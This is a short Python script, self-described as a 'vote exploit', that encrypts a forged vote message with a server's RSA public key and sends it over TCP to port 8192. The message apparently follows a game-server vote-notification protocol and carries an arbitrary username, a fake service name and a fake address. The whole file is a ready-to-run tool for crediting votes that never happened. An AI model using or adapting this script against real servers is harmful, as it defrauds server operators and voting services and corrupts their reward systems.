import socket
import rsa
import time
import sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <ip> <pseudo>")
    exit()

SERVER_IP = sys.argv[1]
USERNAME = sys.argv[2]
SERVER_PORT = 8192
PUBLIC_KEY_PATH = "public_rsa.key"

try:
    with open(PUBLIC_KEY_PATH, "rb") as key_file:
        public_key = rsa.PublicKey.load_pkcs1(key_file.read())
except FileNotFoundError:
    exit()

VOTE_SERVICE = "Rce-Libs on top !"
VOTE_ADDRESS = "1.3.3.7"
VOTE_TIMESTAMP = str(int(time.time()))

vote_data = f"VOTE\n{VOTE_SERVICE}\n{USERNAME}\n{VOTE_ADDRESS}\n{VOTE_TIMESTAMP}\n"

encrypted_vote = rsa.encrypt(vote_data.encode(), public_key)

if len(encrypted_vote) > 256:
    exit()

print("Vote exploit started")
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        s.sendall(encrypted_vote)
        s.recv(1024)
        time.sleep(2)
        s.close()
except:
    pass

print("Vote exploit finish")
